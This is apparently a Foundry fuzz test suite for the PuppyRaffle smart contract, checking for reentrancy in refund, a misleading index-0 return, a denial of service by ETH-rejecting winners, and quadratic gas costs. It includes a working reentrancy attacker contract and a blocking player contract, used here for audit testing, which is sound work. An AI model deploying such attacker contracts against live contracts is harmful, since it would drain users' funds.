// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../../src/PuppyRaffle.sol";

/// Re-enters `refund` from its receive hook while the raffle still holds other players' money.
contract ReentrantRefunder {
    PuppyRaffle private immutable raffle;
    uint256 private immutable fee;
    uint256 private index;

    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
        fee = _raffle.entranceFee();
    }

    function attack() external payable {
        address[] memory me = new address[](1);
        me[0] = address(this);
        raffle.enterRaffle{value: fee}(me);
        index = raffle.getActivePlayerIndex(address(this));
        raffle.refund(index);
    }

    receive() external payable {
        if (address(raffle).balance >= fee) raffle.refund(index);
    }
}

/// A player that is a contract and refuses ETH (and, having no onERC721Received, the NFT too).
contract RejectingPlayer {
    receive() external payable {
        revert("no thanks");
    }
}

/// Stateless fuzz properties for the forge fuzz stage. Each one states a rule the raffle
/// should keep; a failure comes with the inputs that break it.
contract PuppyRaffleFuzz is Test {
    uint256 private constant FEE = 1e18;
    PuppyRaffle private raffle;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(0xFEE), 1 days);
    }

    /// A player can never take out more than the entrance fee they paid.
    function testFuzz_refundPaysOutAtMostTheEntranceFee(uint8 otherPlayers) public {
        uint256 n = bound(uint256(otherPlayers), 1, 20);
        raffle.enterRaffle{value: FEE * n}(_players(n, 0x1000));

        ReentrantRefunder attacker = new ReentrantRefunder(raffle);
        attacker.attack{value: FEE}();

        assertLe(address(attacker).balance, FEE, "refund paid out more than the entrance fee");
    }

    /// Index 0 is a real position, so the raffle must not report 0 for an address that never entered.
    function testFuzz_nonPlayerIsNeverReportedActive(address outsider) public {
        address[] memory players = _players(4, 0x2000);
        for (uint256 i = 0; i < players.length; i++) vm.assume(outsider != players[i]);
        raffle.enterRaffle{value: FEE * 4}(players);

        uint256 index = raffle.getActivePlayerIndex(outsider);
        assertTrue(index != 0 || raffle.players(0) == outsider, "returns 0, the first player's index, for an address that never entered");
    }

    /// Once the raffle is over, a winner can always be drawn, whoever entered.
    function testFuzz_raffleCanAlwaysConclude(uint8 contractPlayers) public {
        uint256 k = bound(uint256(contractPlayers), 0, 4);
        address[] memory players = _players(4, 0x3000);
        for (uint256 i = 0; i < k; i++) players[i] = address(new RejectingPlayer());
        raffle.enterRaffle{value: FEE * 4}(players);
        vm.warp(block.timestamp + 1 days + 1);

        (bool ok, ) = address(raffle).call(abi.encodeWithSignature("selectWinner()"));
        assertTrue(ok, "selectWinner reverted: a winner that rejects ETH or NFTs blocks the raffle for everyone");
    }

    /// Entering must stay affordable: one batch must fit in a block (30M gas).
    /// forge-config: default.fuzz.runs = 10
    function testFuzz_enteringFitsInABlock(uint16 count) public {
        uint256 n = bound(uint256(count), 1, 1000);
        address[] memory players = _players(n, 0x10000);

        uint256 gasBefore = gasleft();
        raffle.enterRaffle{value: FEE * n}(players);
        uint256 used = gasBefore - gasleft();

        assertLe(used, 30_000_000, "the duplicate check is quadratic: a large batch costs more than a block's gas");
    }

    function _players(uint256 n, uint160 base) private pure returns (address[] memory players) {
        players = new address[](n);
        for (uint256 i = 0; i < n; i++) players[i] = address(base + uint160(i));
    }
}
